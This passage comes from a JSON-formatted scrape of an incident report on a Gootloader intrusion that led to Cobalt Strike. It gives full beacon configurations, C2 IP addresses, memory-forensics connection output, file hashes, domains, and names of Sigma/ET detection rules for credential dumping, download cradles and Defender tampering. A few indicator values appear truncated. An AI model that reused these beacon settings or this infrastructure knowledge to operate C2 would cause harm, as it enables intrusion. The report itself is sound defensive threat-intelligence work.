                    "html": "\n146.70.78.43\nCobalt Strike server TLS configuration:\n146.70.78.43\nJa3:72a589da586844d7f0818ce684948eea\nJa3s:f176ba63b4d68e576b5ba345bec2c7b7\nSerial Number: 146473198 (0x8bb00ee)\nCertificate: 73:6B:5E:DB:CF:C9:19:1D:5B:D0:1F:8C:E3:AB:56:38:18:9F:02:4F\nNot Before: May 20 18:26:24 2015 GMT\nNot After: May 17 18:26:24 2025 GMT\nIssuer: C=, ST=, L=, O=, OU=, CN=\nSubject: C=, ST=, L=, O=, OU=, CN=\nPublic Algorithm: rsaEncryption\nCobalt Strike beacon configuration:\nCobalt Strike Beacon:\n x86:\n beacon_type: HTTPS\n dns-beacon.strategy_fail_seconds: -1\n dns-beacon.strategy_fail_x: -1\n dns-beacon.strategy_rotate_seconds: -1\n http-get.client:\n Cookie\n http-get.uri: 146.70.78.43,/visit.js\n http-get.verb: GET\n http-post.client:\n Content-Type: application/octet-stream\n id\n http-post.uri: /submit.php\n http-post.verb: POST\n maxgetsize: 1048576\n port: 443\n post-ex.spawnto_x64: %windir%\\sysnative\\rundll32.exe\n post-ex.spawnto_x86: %windir%\\syswow64\\rundll32.exe\n process-inject.execute:\n CreateThread\n SetThreadContext\n CreateRemoteThread\n RtlCreateUserThread\n process-inject.startrwx: 64\n process-inject.stub: 222b8f27dbdfba8ddd559eeca27ea648\n process-inject.userwx: 64\n proxy.behavior: 2 (Use IE settings)\n server.publickey_md5: defb5d95ce99e1ebbf421a1a38d9cb64\n sleeptime: 60000\n useragent_header: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0; yie9)\n uses_cookies: 1\n watermark: 1580103824\n x64:\n beacon_type: HTTPS\n dns-beacon.strategy_fail_seconds: -1\n dns-beacon.strategy_fail_x: -1\n dns-beacon.strategy_rotate_seconds: -1\n http-get.client:\n Cookie\n http-get.uri: 146.70.78.43,/fwlink\n http-get.verb: GET\n http-post.client:\n Content-Type: application/octet-stream\n id\n http-post.uri: /submit.php\n http-post.verb: POST\n maxgetsize: 1048576\n port: 443\n post-ex.spawnto_x64: %windir%\\sysnative\\rundll32.exe\n post-ex.spawnto_x86: %windir%\\syswow64\\rundll32.exe\n process-inject.execute:\n CreateThread\n SetThreadContext\n CreateRemoteThread\n RtlCreateUserThread\n process-inject.startrwx: 64\n process-inject.stub: 222b8f27dbdfba8ddd559eeca27ea648\n process-inject.userwx: 64\n proxy.behavior: 2 (Use IE settings)\n server.publickey_md5: defb5d95ce99e1ebbf421a1a38d9cb64\n sleeptime: 60000\n useragent_header: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0; BOIE9;ENXA)\n uses_cookies: 1\n watermark: 1580103824\n37.120.198.225\nCobalt Strike server TLS configuration:\nJa3:72a589da586844d7f0818ce684948eea\nJa3s:f176ba63b4d68e576b5ba345bec2c7b7\nSerial Number: 146473198 (0x8bb00ee)\nCertificate: 73:6B:5E:DB:CF:C9:19:1D:5B:D0:1F:8C:E3:AB:56:38:18:9F:02:4F\nNot Before: May 20 18:26:24 2015 GMT\nNot After : May 17 18:26:24 2025 GMT\nIssuer: C=, ST=, L=, O=, OU=, CN=\nSubject: C=, ST=, L=, O=, OU=, CN=\nPublic Algorithm: rsaEncryption\nCobalt Strike beacon configuration:\nCobalt Strike Beacon:\n x86:\n beacon_type: HTTPS\n dns-beacon.strategy_fail_seconds: -1\n dns-beacon.strategy_fail_x: -1\n dns-beacon.strategy_rotate_seconds: -1\n http-get.client:\n Cookie\n http-get.uri: 37.120.198.225,/cm\n http-get.verb: GET\n http-post.client:\n Content-Type: application/octet-stream\n id\n http-post.uri: /submit.php\n http-post.verb: POST\n maxgetsize: 1048576\n port: 443\n post-ex.spawnto_x64: %windir%\\sysnative\\rundll32.exe\n post-ex.spawnto_x86: %windir%\\syswow64\\rundll32.exe\n process-inject.execute:\n CreateThread\n SetThreadContext\n CreateRemoteThread\n RtlCreateUserThread\n process-inject.startrwx: 64\n process-inject.stub: 222b8f27dbdfba8ddd559eeca27ea648\n process-inject.userwx: 64\n proxy.behavior: 2 (Use IE settings)\n server.publickey_md5: defb5d95ce99e1ebbf421a1a38d9cb64\n sleeptime: 60000\n useragent_header: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0; BOIE9;ENUSMSE)\n uses_cookies: 1\n watermark: 1580103824\n x64:\n beacon_type: HTTPS\n dns-beacon.strategy_fail_seconds: -1\n dns-beacon.strategy_fail_x: -1\n dns-beacon.strategy_rotate_seconds: -1\n http-get.client:\n Cookie\n http-get.uri: 37.120.198.225,/ptj\n http-get.verb: GET\n http-post.client:\n Content-Type: application/octet-stream\n id\n http-post.uri: /submit.php\n http-post.verb: POST\n maxgetsize: 1048576\n port: 443\n post-ex.spawnto_x64: %windir%\\sysnative\\rundll32.exe\n post-ex.spawnto_x86: %windir%\\syswow64\\rundll32.exe\n process-inject.execute:\n CreateThread\n SetThreadContext\n CreateRemoteThread\n RtlCreateUserThread\n process-inject.startrwx: 64\n process-inject.stub: 222b8f27dbdfba8ddd559eeca27ea648\n process-inject.userwx: 64\n proxy.behavior: 2 (Use IE settings)\n server.publickey_md5: defb5d95ce99e1ebbf421a1a38d9cb64\n sleeptime: 60000\n useragent_header: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0; FunWebProducts; IE0006_ver1;EN_GB)\n uses_cookies: 1\n watermark: 1580103824\n"
                },
                {
                    "id": "<sentence_0x19cf2c0>",
                    "is_empty": false,
                    "have_tags": true,
                    "tags": {
                        "<a_0xd363be21>": "https://github.com/activecm/rita"
                    },
                    "text": "Real Intelligence Threat Analytics (RITA)",
                    "html": "<a class=\"ql-link\" href=\"https://github.com/activecm/rita\" rel=\"noopener noreferrer\" target=\"_blank\">Real Intelligence Threat Analytics (RITA)</a>"
                },
                {
                    "id": "<sentence_0x5ff07db>",
                    "is_empty": false,
                    "have_tags": false,
                    "tags": {},
                    "text": "was successful in locating one of the IP addresses used for Cobalt Strike command and control communications.",
                    "html": " was successful in locating one of the IP addresses used for Cobalt Strike command and control communications. \n"
                },
                {
                    "id": "<sentence_0xa3b321aa>",
                    "is_empty": true,
                    "have_tags": false,
                    "tags": {},
                    "text": "",
                    "html": "<a href=\"https://thedfirreport.com/wp-content/uploads/2022/05/11462-30.png\"><img alt=\"\" class=\"aligncenter size-full wp-image-6781 jetpack-lazy-image\" height=\"164\" src=\"https://thedfirreport.com/wp-content/uploads/2022/05/11462-30.png\" width=\"1600\"/><img alt=\"\" class=\"aligncenter size-full wp-image-6781\" height=\"164\" src=\"https://thedfirreport.com/wp-content/uploads/2022/05/11462-30.png\" width=\"1600\"/></a>"
                },
                {
                    "id": "<sentence_0xa2f3d01>",
                    "is_empty": false,
                    "have_tags": false,
                    "tags": {},
                    "text": "Netscan data extracted via Volatility from the beachhead host showing Cobalt Strike C2 connections:<crlf>Volatility 3 Framework 2.0.0<crlf>Offset Proto LocalAddr LocalPort ForeignAddr ForeignPort State PID Owner Created<crlf>...<crlf>0x948431c46010 TCPv4 10.X.X.X 52670 146.70.78.43 443 CLOSE_WAIT 3420 rundll32.exe<crlf>0x948431e19010 TCPv4 10.X.X.X 63723 146.70.78.43 443 CLOSED 3420 rundll32.exe<crlf>0x9484337f18a0 TCPv4 10.X.X.X 52697 146.70.78.43 443 CLOSE_WAIT 3420 rundll32.exe<crlf>0x948435102050 TCPv4 10.X.X.X 52689 146.70.78.43 443 CLOSE_WAIT 3420 rundll32.exe<crlf>...",
                    "html": "\n \nNetscan data extracted via Volatility from the beachhead host showing Cobalt Strike C2 connections:\nVolatility 3 Framework 2.0.0\nOffset Proto LocalAddr LocalPort ForeignAddr ForeignPort State PID Owner Created\n...\n0x948431c46010 TCPv4 10.X.X.X 52670 146.70.78.43 443 CLOSE_WAIT 3420 rundll32.exe \n0x948431e19010 TCPv4 10.X.X.X 63723 146.70.78.43 443 CLOSED 3420 rundll32.exe \n0x9484337f18a0 TCPv4 10.X.X.X 52697 146.70.78.43 443 CLOSE_WAIT 3420 rundll32.exe \n0x948435102050 TCPv4 10.X.X.X 52689 146.70.78.43 443 CLOSE_WAIT 3420 rundll32.exe \n... \n"
                }
            ]
        },
        {
            "id": "<chapter_0x4ce4ef27>",
            "title": "Impact",
            "title_level": 2,
            "sentences": [
                {
                    "id": "<sentence_0x3bcdec10>",
                    "is_empty": false,
                    "have_tags": false,
                    "tags": {},
                    "text": "In this case, there was no further impact to the environment before the threat actors were evicted.",
                    "html": "\nIn this case, there was no further impact to the environment before the threat actors were evicted.\n \n"
                }
            ]
        },
        {
            "id": "<chapter_0x1b70be5c>",
            "title": "Indicators",
            "title_level": 3,
            "sentences": []
        },
        {
            "id": "<chapter_0xd7cae760>",
            "title": "Network",
            "title_level": 3,
            "sentences": [
                {
                    "id": "<sentence_0xd6302866>",
                    "is_empty": false,
                    "have_tags": false,
                    "tags": {},
                    "text": "Gootloader<crlf>https://kakiosk.adsparkdev[.]com<crlf>https://jp.imonitorsoft[.]com<crlf>https://junk-bros[.]com<crlf>35.206.117.64:443<crlf>Cobalt Strike<crlf>146.70.78.43:443<crlf>37.120.198.225:44",
                    "html": "\nGootloader\nhttps://kakiosk.adsparkdev[.]com\nhttps://jp.imonitorsoft[.]com\nhttps://junk-bros[.]com\n35.206.117.64:443\nCobalt Strike\n146.70.78.43:443\n37.120.198.225:44\n"
                },
                {
                    "id": "<sentence_0x8fa51329>",
                    "is_empty": false,
                    "have_tags": false,
                    "tags": {},
                    "text": "ET HUNTING Suspicious Empty SSL Certificate - Observed in Cobalt Strike<crlf>ET MALWARE Meterpreter or Other Reverse Shell SSL Cert",
                    "html": "\nET HUNTING Suspicious Empty SSL Certificate - Observed in Cobalt Strike \nET MALWARE Meterpreter or Other Reverse Shell SSL Cert\n"
                }
            ]
        },
        {
            "id": "<chapter_0x15d5ad80>",
            "title": "File",
            "title_level": 3,
            "sentences": [
                {
                    "id": "<sentence_0x69cbd249>",
                    "is_empty": false,
                    "have_tags": false,
                    "tags": {},
                    "text": "olympus_plea_agreement 34603 .js<crlf>d7d3e1c76d5e2fa9f7253c8ababd6349<crlf>724013ea6906a3122698fd125f55546eac0c1fe0<crlf>6e141779a4695a637682d64f7bc09973bb82cd24211b2020c8c1648cdb41001b<crlf>olympus plea agreement(46196).zip<crlf>b50333ff4e5cbcda8b88ce109e882eeb<crlf>44589fc2a4d1379bee93282bbdb16acbaf762a45<crlf>7d93b3531f5ab7ef8d68fb3d06f57e889143654de4ba661e5975dae9679bbb2c<crlf>mi.ps1<crlf>acef25c1f6a7da349e62b365c05ae60c<crlf>c5d134a96ca4d33e96fb0ab68cf3139a95cf8071<crlf>d00edf5b9a9a23d3f891afd51260b3356214655a73e1a361701cda161798ea0b<crlf>Invoke-WMIExec.ps1<crlf>b4626a335789e457ea48e56dfbf39710<crlf>62a7656d81789591358796100390799e83428519<crlf>c4939f6ad41d4f83b427db797aaca106b865b6356b1db3b7c63b995085457222<crlf>ls.exe<crlf>87ae2a50ba94f45da39ec7673d71547c<crlf>dfa0b4206abede8f441fcdc8155803b8967e035c<crlf>8764131983eac23033c460833de5e439a4c475ad94cfd561d80cb62f86ff",
                    "html": "\nolympus_plea_agreement 34603 .js\nd7d3e1c76d5e2fa9f7253c8ababd6349\n724013ea6906a3122698fd125f55546eac0c1fe0\n6e141779a4695a637682d64f7bc09973bb82cd24211b2020c8c1648cdb41001b\nolympus plea agreement(46196).zip\nb50333ff4e5cbcda8b88ce109e882eeb\n44589fc2a4d1379bee93282bbdb16acbaf762a45\n7d93b3531f5ab7ef8d68fb3d06f57e889143654de4ba661e5975dae9679bbb2c\nmi.ps1\nacef25c1f6a7da349e62b365c05ae60c\nc5d134a96ca4d33e96fb0ab68cf3139a95cf8071\nd00edf5b9a9a23d3f891afd51260b3356214655a73e1a361701cda161798ea0b\nInvoke-WMIExec.ps1\nb4626a335789e457ea48e56dfbf39710\n62a7656d81789591358796100390799e83428519\nc4939f6ad41d4f83b427db797aaca106b865b6356b1db3b7c63b995085457222\nls.exe\n87ae2a50ba94f45da39ec7673d71547c\ndfa0b4206abede8f441fcdc8155803b8967e035c\n8764131983eac23033c460833de5e439a4c475ad94cfd561d80cb62f86ff\n"
                }
            ]
        },
        {
            "id": "<chapter_0x6066e511>",
            "title": "Detections",
            "title_level": 2,
            "sentences": []
        },
        {
            "id": "<chapter_0xec7b92b3>",
            "title": "Sigma",
            "title_level": 3,
            "sentences": [
                {
                    "id": "<sentence_0xa956d7a4>",
                    "is_empty": false,
                    "have_tags": true,
                    "tags": {
                        "<a_0xc4dbe149>": "https://github.com/The-DFIR-Report/Sigma-Rules/blob/main/Deleting%20Windows%20Defender%20scheduled%20tasks"
                    },
                    "text": "Deleting Windows Defender scheduled tasks",
                    "html": "<p><a href=\"https://github.com/The-DFIR-Report/Sigma-Rules/blob/main/Deleting%20Windows%20Defender%20scheduled%20tasks\" rel=\"noopener\" target=\"_blank\">Deleting Windows Defender scheduled tasks</a></p>"
                },
                {
                    "id": "<sentence_0x3b75d472>",
                    "is_empty": false,
                    "have_tags": true,
                    "tags": {
                        "<a_0x2f24f6d8>": "https://github.com/The-DFIR-Report/Sigma-Rules/blob/main/Enabling%20restricted%20admin%20mode"
                    },
                    "text": "Enabling restricted admin mode",
                    "html": "<p><a href=\"https://github.com/The-DFIR-Report/Sigma-Rules/blob/main/Enabling%20restricted%20admin%20mode\" rel=\"noopener\" target=\"_blank\">Enabling restricted admin mode</a></p>"
                },
                {
                    "id": "<sentence_0xbc57784e>",
                    "is_empty": false,
                    "have_tags": true,
                    "tags": {
                        "<a_0xa84e272e>": "https://github.com/The-DFIR-Report/Sigma-Rules/blob/main/Using%20powershell%20specific%20download%20cradle%20OneLiner"
                    },
                    "text": "Using powershell specific download cradle OneLiner",
                    "html": "<p><a href=\"https://github.com/The-DFIR-Report/Sigma-Rules/blob/main/Using%20powershell%20specific%20download%20cradle%20OneLiner\" rel=\"noopener\" target=\"_blank\">Using powershell specific download cradle OneLiner</a></p>"
                },
                {
                    "id": "<sentence_0x5b46611>",
                    "is_empty": false,
                    "have_tags": true,
                    "tags": {
                        "<a_0xf751b436>": "https://github.com/The-DFIR-Report/Sigma-Rules/blob/main/Using%20Lazagne%20to%20dump%20credentials"
                    },
                    "text": "Using Lazagne to dump credentials",
                    "html": "<p><a href=\"https://github.com/The-DFIR-Report/Sigma-Rules/blob/main/Using%20Lazagne%20to%20dump%20credentials\" rel=\"noopener\" target=\"_blank\">Using Lazagne to dump credentials</a></p>"
                },
                {
                    "id": "<sentence_0x4b740c6a>",
                    "is_empty": false,
                    "have_tags": false,
                    "tags": {},
                    "text": "Bloodhound Detection",
                    "html": "\nBloodhound Detection \u2013 "
                },
                {
                    "id": "<sentence_0xa2336b73>",
                    "is_empty": true,
                    "have_tags": true,
                    "tags": {
                        "<a_0x1208da45>": "https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_hack_bloodhound.yml"
                    },
                    "text": "",
                    "html": "<a href=\"https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_hack_bloodhound.yml\">https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_hack_bloodhound.yml</a>"
                },
                {
                    "id": "<sentence_0xdb31262f>",
                    "is_empty": false,
                    "have_tags": false,
                    "tags": {},
                    "text": "Powershell download",
                    "html": "\nPowershell download \u2013 "
                },
                {
                    "id": "<sentence_0xd8faa808>",
                    "is_empty": true,
                    "have_tags": true,
                    "tags": {
                        "<a_0xbb83b316>": "https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_powershell_download_patterns.yml"
                    },
                    "text": "",
                    "html": "<a href=\"https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_powershell_download_patterns.yml\">https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_powershell_download_patterns.yml</a>"
                },
                {
                    "id": "<sentence_0x79583aa0>",
                    "is_empty": false,
                    "have_tags": false,
                    "tags": {},
                    "text": "Defender Disable via Powershell",
                    "html": "\nDefender Disable via Powershell \u2013 "
                },
                {
                    "id": "<sentence_0xbc88f7c6>",
                    "is_empty": true,
                    "have_tags": true,
                    "tags": {
                        "<a_0x44d08544>": "https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_powershell_defender_disable_feature.yml"
                    },
                    "text": "",
                    "html": "<a href=\"https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_powershell_defender_disable_feature.yml\">https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_powershell_defender_disable_feature.yml</a>"
                },
                {
                    "id": "<sentence_0x1eb029b>",
                    "is_empty": false,
                    "have_tags": false,
                    "tags": {},
                    "text": "Creation of Scheduled Task via Powershell",
                    "html": "\nCreation of Scheduled Task via Powershell \u2013 "
                },
                {
                    "id": "<sentence_0xe9b112f1>",
                    "is_empty": true,
                    "have_tags": true,
                    "tags": {
                        "<a_0x70e681cb>": "https://github.com/SigmaHQ/sigma/blob/master/rules/windows/powershell/powershell_script/posh_ps_cmdlet_scheduled_task.yml"
                    },
                    "text": "",
                    "html": "<a href=\"https://github.com/SigmaHQ/sigma/blob/master/rules/windows/powershell/powershell_script/posh_ps_cmdlet_scheduled_task.yml\">https://github.com/SigmaHQ/sigma/blob/master/rules/windows/powershell/powershell_script/posh_ps_cmdlet_scheduled_task.yml</a>"
                },
                {
                    "id": "<sentence_0xed32ec09>",
                    "is_empty": false,
                    "have_tags": false,
                    "tags": {},
                    "text": "LaZagne LSASS Access",
                    "html": "\nLaZagne LSASS Access \u2013 "
                },
                {
                    "id": "<sentence_0xb8e5383f>",
                    "is_empty": true,
                    "have_tags": true,
                    "tags": {
                        "<a_0xe6866f6e>": "https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_access/proc_access_win_lazagne_cred_dump_lsass_access.yml"
                    },
                    "text": "",
                    "html": "<a href=\"https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_access/proc_access_win_lazagne_cred_dump_lsass_access.yml\">https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_access/proc_access_win_lazagne_cred_dump_lsass_access.yml</a>"
                },
                {
                    "id": "<sentence_0x16e28dad>",
                    "is_empty": false,
                    "have_tags": false,
                    "tags": {},
                    "text": "Systeminfo Discovery",
                    "html": "\nSysteminfo Discovery \u2013 "
                },
                {
                    "id": "<sentence_0x23592af9>",
                    "is_empty": true,
                    "have_tags": true,
                    "tags": {
                        "<a_0xf4fbe128>": "https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_susp_systeminfo.yml"
                    },
                    "text": "",
                    "html": "<a href=\"https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_susp_systeminfo.yml\">https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_susp_systeminfo.yml</a>"
                },
                {
                    "id": "<sentence_0x21d33fe6>",
                    "is_empty": false,
                    "have_tags": false,
                    "tags": {},
                    "text": "CobaltStrike Named Pipe",
                    "html": "\nCobaltStrike Named Pipe \u2013 "
                },
                {
                    "id": "<sentence_0x9315f6aa>",
                    "is_empty": true,
                    "have_tags": true,
                    "tags": {
                        "<a_0xe6f7c0b7>": "https://github.com/SigmaHQ/sigma/blob/7fb8272f948cc0b528fe7bd36df36449f74b2266/rules/windows/pipe_created/pipe_created_mal_cobaltstrike.yml"
                    },
                    "text": "",
                    "html": "<a href=\"https://github.com/SigmaHQ/sigma/blob/7fb8272f948cc0b528fe7bd36df36449f74b2266/rules/windows/pipe_created/pipe_created_mal_cobaltstrike.yml\">https://github.com/SigmaHQ/sigma/blob/7fb8272f948cc0b528fe7bd36df36449f74b2266/rules/windows/pipe_created/pipe_created_mal_cobaltstrike.yml</a>"
                },
                {
                    "id": "<sentence_0xf8fe885>",
                    "is_empty": false,
                    "have_tags": false,
                    "tags": {},
                    "text": "Malicious PowerShell Commandlets",
                    "html": "\nMalicious PowerShell Commandlets \u2013 "
                },
                {
                    "id": "<sentence_0x594a9c91>",
                    "is_empty": true,
                    "have_tags": true,
                    "tags": {
                        "<a_0x75860ac2>": "https://github.com/SigmaHQ/sigma/blob/becf3baeb4f6313bf267f7e8d6e9808fc0fc059c/rules/windows/powershell/powershell_script/posh_ps_malicious_commandlets.yml"
                    },
                    "text": "",
                    "html": "<a href=\"https://github.com/SigmaHQ/sigma/blob/becf3baeb4f6313bf267f7e8d6e9808fc0fc059c/rules/windows/powershell/powershell_script/posh_ps_malicious_commandlets.yml\">https://github.com/SigmaHQ/sigma/blob/becf3baeb4f6313bf267f7e8d6e9808fc0fc059c/rules/windows/powershell/powershell_script/posh_ps_malicious_commandlets.yml</a>"
                },
                {
                    "id": "<sentence_0x77f9f027>",
                    "is_empty": false,
                    "have_tags": false,
                    "tags": {},
                    "text": "Suspicious Service Installation",
                    "html": "\nSuspicious Service Installation \u2013 "
                },
                {
                    "id": "<sentence_0xcb4a96d7>",
                    "is_empty": true,
                    "have_tags": true,
                    "tags": {
                        "<a_0xe5c9fa00>": "https://github.com/SigmaHQ/sigma/blob/7d48d0e838b76f3fb5bc623e7ec45343cfac9c88/rules/windows/builtin/system/win_susp_service_installation.yml"
                    },
                    "text": "",
                    "html": "<a href=\"https://github.com/SigmaHQ/sigma/blob/7d48d0e838b76f3fb5bc623e7ec45343cfac9c88/rules/windows/builtin/system/win_susp_service_installation.yml\">https://github.com/SigmaHQ/sigma/blob/7d48d0e838b76f3fb5bc623e7ec45343cfac9c88/rules/windows/builtin/system/win_susp_service_installation.yml</a>"
                },
                {
                    "id": "<sentence_0xdd70a12b>",
                    "is_empty": false,
                    "have_tags": false,
                    "tags": {},
                    "text": "Suspicious XOR Encoded PowerShell Command Line",
                    "html": "\nSuspicious XOR Encoded PowerShell Command Line \u2013"
                },
                {
                    "id": "<sentence_0x27dd8b36>",
                    "is_empty": true,
                    "have_tags": true,
                    "tags": {
                        "<a_0x27d7896d>": "https://github.com/SigmaHQ/sigma/blob/becf3baeb4f6313bf267f7e8d6e9808fc0fc059c/rules/windows/powershell/powershell_classic/posh_pc_xor_commandline.yml"
                    },
                    "text": "",
                    "html": "<a href=\"https://github.com/SigmaHQ/sigma/blob/becf3baeb4f6313bf267f7e8d6e9808fc0fc059c/rules/windows/powershell/powershell_classic/posh_pc_xor_commandline.yml\"> https://github.com/SigmaHQ/sigma/blob/becf3baeb4f6313bf267f7e8d6e9808fc0fc059c/rules/windows/powershell/powershell_classic/posh_pc_xor_commandline.yml</a>"
                },
                {
                    "id": "<sentence_0xf5fe0a93>",
                    "is_empty": false,
                    "have_tags": false,
                    "tags": {},
                    "text": "Too Long PowerShell Commandlines",
                    "html": "\nToo Long PowerShell Commandlines \u2013 "
                },
                {
                    "id": "<sentence_0xd5174341>",
                    "is_empty": true,
                    "have_tags": true,
                    "tags": {
                        "<a_0x1d963a00>": "https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_long_powershell_commandline.yml"
                    },
                    "text": "",
                    "html": "<a href=\"https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_long_powershell_commandline.yml\">https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_long_powershell_commandline.yml</a>"
                },
                {
                    "id": "<sentence_0xb64efd0f>",
                    "is_empty": false,
                    "have_tags": false,
                    "tags": {},
                    "text": "PowerShell Network Connections",
                    "html": "\nPowerShell Network Connections \u2013 "
                },
                {
                    "id": "<sentence_0xfd42cd70>",
                    "is_empty": true,
                    "have_tags": true,
                    "tags": {
                        "<a_0x691e94ef>": "https://github.com/SigmaHQ/sigma/blob/master/rules/windows/network_connection/net_connection_win_powershell_network_connection.yml"
                    },
                    "text": "",
                    "html": "<a href=\"https://github.com/SigmaHQ/sigma/blob/master/rules/windows/network_connection/net_connection_win_powershell_network_connection.yml\">https://github.com/SigmaHQ/sigma/blob/master/rules/windows/network_connection/net_connection_win_powershell_network_connection.yml</a>"
                },
                {
                    "id": "<sentence_0x70d8ce35>",
                    "is_empty": false,
                    "have_tags": false,
                    "tags": {},
                    "text": "Rundll32 Internet Connection",
                    "html": "\nRundll32 Internet Connection \u2013 "
                },
                {
                    "id": "<sentence_0xbb9c9a53>",
                    "is_empty": true,
                    "have_tags": true,
                    "tags": {
                        "<a_0x2bb7b0f2>": "https://github.com/SigmaHQ/sigma/blob/master/rules/windows/network_connection/net_connection_win_rundll32_net_connections.yml"
                    },
                    "text": "",
                    "html": "<a href=\"https://github.com/SigmaHQ/sigma/blob/master/rules/windows/network_connection/net_connection_win_rundll32_net_connections.yml\">https://github.com/SigmaHQ/sigma/blob/master/rules/windows/network_connection/net_connection_win_rundll32_net_connections.yml</a>"
                },
                {
                    "id": "<sentence_0xdd320740>",
                    "is_empty": false,
                    "have_tags": false,
                    "tags": {},
                    "text": "Mimikatz Use",
                    "html": "\nMimikatz Use \u2013 "
                },
                {
                    "id": "<sentence_0x46ed55ac>",
                    "is_empty": true,
                    "have_tags": true,
                    "tags": {
                        "<a_0xc671c919>": "https://github.com/SigmaHQ/sigma/blob/master/rules/windows/builtin/win_alert_mimikatz_keywords.yml"
                    },
                    "text": "",
                    "html": "<a href=\"https://github.com/SigmaHQ/sigma/blob/master/rules/windows/builtin/win_alert_mimikatz_keywords.yml\">https://github.com/SigmaHQ/sigma/blob/master/rules/windows/builtin/win_alert_mimikatz_keywords.yml</a>"
                }
            ]
        },
        {
            "id": "<chapter_0xb1f69eca>",
            "title": "Yara",
            "title_level": 3,
            "sentences": [
                {
                    "id": "<sentence_0xabe2a22>",
                    "is_empty": false,
                    "have_tags": true,
                    "tags": {
                        "<a_0x2f91d8f>": "https://github.com/The-DFIR-Report/Yara-Rules/blob/main/SEO%20Poisoning%20%E2%80%93%20A%20Gootloader%20Story"
                    },
                    "text": "Custom Yara rule",
                    "html": "<p><a href=\"https://github.com/The-DFIR-Report/Yara-Rules/blob/main/SEO%20Poisoning%20%E2%80%93%20A%20Gootloader%20Story\" rel=\"noopener\" target=\"_blank\">Custom Yara rule</a></p>"
                }
            ]
        },
        {
            "id": "<chapter_0x57049456>",
            "title": "MITRE",
            "title_level": 2,
            "sentences": [
                {
                    "id": "<sentence_0xcf5d2e9>",
                    "is_empty": false,
                    "have_tags": false,
                    "tags": {},
                    "text": "T1189 Drive-by Compromise<crlf>T1204.001 User Execution: Malicious Link<crlf>T1204.002 User Execution: Malicious File<crlf>T1059.001 Command and Scripting Interpreter: PowerShell<crlf>T1053 Scheduled Task/Job<crlf>T1218.011 System Binary Proxy Execution: Rundll32<crlf>T1555 Credentials from Password Stores<crlf>T1003.001- OS Credential Dumping: LSASS Memory<crlf>T1087 Account Discovery<crlf>T1560 Archive Collected Data<crlf>T1482 Domain Trust Discovery<crlf>T1615 Group Policy Discovery<crlf>T1069 Permission Groups Discovery<crlf>T1018 Remote System Discovery<crlf>T1033 System Owner/User Discovery<crlf>T1021.001 Remote Services: Remote Desktop Protocol<crlf>T1021.006 Remote Services: Windows Remote Management<crlf>T1005 Data from Local System<crlf>T1039 Data from Network Shared Drive<crlf>T1046 Network Service Scanning<crlf>T1562.001 Impair Defenses: Disable or Modify Tools<crlf>T1518.001 Security Software Discovery<crlf>T1071.001 Web Protocols<crlf>T1027 Obfuscated Files or Information",
                    "html": "<ul>\n<li class=\"ql-block\">T1189 Drive-by Compromise</li>\n<li class=\"ql-block\">T1204.001 \u2013 User Execution: Malicious Link</li>\n<li class=\"ql-block\">T1204.002 \u2013 User Execution: Malicious File</li>\n<li class=\"ql-block\">T1059.001 \u2013 Command and Scripting Interpreter: PowerShell</li>\n<li class=\"ql-block\">T1053 \u2013 Scheduled Task/Job</li>\n<li class=\"ql-block\">T1218.011 \u2013 System Binary Proxy Execution: Rundll32</li>\n<li class=\"ql-block\">T1555 \u2013 Credentials from Password Stores</li>\n<li class=\"ql-block\">T1003.001- OS Credential Dumping: LSASS Memory</li>\n<li class=\"ql-block\">T1087 \u2013 Account Discovery</li>\n<li class=\"ql-block\">T1560 \u2013 Archive Collected Data</li>\n<li class=\"ql-block\">T1482 \u2013 Domain Trust Discovery</li>\n<li class=\"ql-block\">T1615 \u2013 Group Policy Discovery</li>\n<li class=\"ql-block\">T1069 \u2013 Permission Groups Discovery</li>\n<li class=\"ql-block\">T1018 \u2013 Remote System Discovery</li>\n<li class=\"ql-block\">T1033 \u2013 System Owner/User Discovery</li>\n<li class=\"ql-block\">T1021.001 \u2013 Remote Services: Remote Desktop Protocol</li>\n<li class=\"ql-block\">T1021.006 \u2013 Remote Services: Windows Remote Management</li>\n<li class=\"ql-block\">T1005 \u2013 Data from Local System</li>\n<li class=\"ql-block\">T1039 \u2013 Data from Network Shared Drive</li>\n<li class=\"ql-block\">T1046 \u2013 Network Service Scanning</li>\n<li class=\"ql-block\">T1562.001 \u2013 Impair Defenses: Disable or Modify Tools</li>\n<li class=\"ql-block\">T1518.001 \u2013 Security Software Discovery</li>\n<li class=\"ql-block\">T1071.001 Web Protocols</li>\n<li class=\"ql-block\">T1027 \u2013 Obfuscated Files or Information</li>\n</ul>"
                },
                {
                    "id": "<sentence_0xe63d7b41>",
                    "is_empty": false,
                    "have_tags": false,
                    "tags": {},
                    "text": "Internal case #11462",
                    "html": "\n \nInternal case #11462\n"
                }
            ]
        }
    ]
}